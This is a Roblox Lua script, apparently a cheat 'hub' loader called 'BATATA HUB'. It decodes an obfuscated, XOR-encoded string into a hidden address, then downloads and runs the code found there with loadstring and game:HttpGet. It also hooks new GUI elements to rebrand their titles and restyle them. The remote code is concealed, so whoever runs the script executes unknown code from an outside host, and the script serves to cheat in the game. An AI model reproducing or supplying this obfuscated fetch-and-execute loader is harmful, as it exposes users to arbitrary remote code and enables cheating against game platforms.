
--[[ STAGE 2: VISUAL CORE ]]
local QoiU0FSjFimg3LOjaU="\152\146\159\227\223\185\240\194\204\210\252\009\170\234\234\223\236\248\210\212\003\005\020\015\038\252\254\033\058\035\022\064\083\094\085\098\061\176\117\122\136\138\206\149\155\166\158\168\182\182\177\199\010\217\202\219\232\234\248\246\000\255\006\011\082\026\030\040\105\041\053\070\059\071\078\088\077\106\090\102\117\114\123\125\136\152\213\148\168\155\238\244\229\180\187\197\203\213"local NnqSjrCnOBXN_vrQ=90 local NQjgu9kQMxCN=67 local npkVbqBI_0V_t=0 local asdukobQwh3N5RusYj=6 local j5XYdSE_h3_dw65wB8a=20 local krxQVb1qxeDa=true local YNsFHAZDE21b=bit32 and bit32.bxor if not YNsFHAZDE21b then YNsFHAZDE21b=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local iSmmsNCXvwmY1ap={}for cX7y_ExHdjyFpnFBZ2UFm=1,#QoiU0FSjFimg3LOjaU do local j46vgkrVuhLAbmRc=string.byte(QoiU0FSjFimg3LOjaU,cX7y_ExHdjyFpnFBZ2UFm)local eAKPc3qVfw4vZ3gH90x8=(NQjgu9kQMxCN+(cX7y_ExHdjyFpnFBZ2UFm*asdukobQwh3N5RusYj)+j5XYdSE_h3_dw65wB8a)%256 if npkVbqBI_0V_t==0 then j46vgkrVuhLAbmRc=(j46vgkrVuhLAbmRc-eAKPc3qVfw4vZ3gH90x8)%256 iSmmsNCXvwmY1ap[cX7y_ExHdjyFpnFBZ2UFm]=string.char(YNsFHAZDE21b(j46vgkrVuhLAbmRc,NnqSjrCnOBXN_vrQ))else j46vgkrVuhLAbmRc=YNsFHAZDE21b(j46vgkrVuhLAbmRc,NnqSjrCnOBXN_vrQ)iSmmsNCXvwmY1ap[cX7y_ExHdjyFpnFBZ2UFm]=string.char((j46vgkrVuhLAbmRc-eAKPc3qVfw4vZ3gH90x8)%256)end end local yAq8UfZu9cqxH8H=table.concat(iSmmsNCXvwmY1ap)if krxQVb1qxeDa then yAq8UfZu9cqxH8H=string.reverse(yAq8UfZu9cqxH8H)end local LtVPEAnDAwH2luRwYhFd=yAq8UfZu9cqxH8H
local HubName = "BATATA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(LtVPEAnDAwH2luRwYhFd))()
